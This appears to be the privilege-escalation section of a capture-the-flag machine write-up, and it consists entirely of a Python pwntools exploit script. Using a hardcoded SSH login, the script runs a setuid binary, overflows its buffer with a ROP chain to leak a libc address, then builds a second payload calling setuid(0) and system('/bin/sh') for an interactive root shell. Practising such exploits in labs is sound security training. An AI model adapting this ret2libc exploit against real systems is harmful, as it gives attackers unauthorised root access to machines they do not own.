# 2 root 
```
from pwn import *
shell = ssh('margo', '10.10.10.139', password='iamgod$08', port=22)
p=shell.process(['/usr/bin/garbage'])
#p=process('./garbage')
pop_rdi=p64(0x40179b)  #0x000000000040179b : pop rdi ; ret
got_plt=p64(0x404028)  # 404028 <puts@GLIBC_2.2.5>
put_plt=p64(0x401050)  #0000000000401050 <puts@plt>:
main=p64(0x401619)     #<main>:
payload ="A"*136+pop_rdi+got_plt+put_plt+main
p.sendline(payload)
raw_input("<gdb <>  ")
leak=p.recvuntil('access denied.')
s= p.recv()[:8].strip().ljust(8,'\x00') #leaked_output
z = struct.unpack("<Q",s)
put_sys=hex(z[0])#puts_gahz
###########################2ND STAGE###############################
puts_off=0x809c0 # new
sys_off=0x4f440  # newbinsh_off
binsh_off=0x1b3e9a #new
setuid_off=0xe5970 #new
base=hex(int(put_sys,16) - puts_off)
setuid=hex(int(base,16) + setuid_off)
sys=hex(int(base,16) + sys_off)
bin_sh=hex(int(base,16) + binsh_off)
print 'base add -> '+base
print 'put  ->   '+ put_sys
print 'system -> '+sys
print 'bin_sh -> '+bin_sh
print 'setuid-> ' + setuid
sys=p64(int(sys,16))
bin_sh=p64(int(bin_sh,16))
setuid=p64(int(setuid,16))
payload = "A"*136+pop_rdi+p64(0x0)+setuid+pop_rdi+bin_sh+sys
p.sendline(payload)
p.interactive()

```
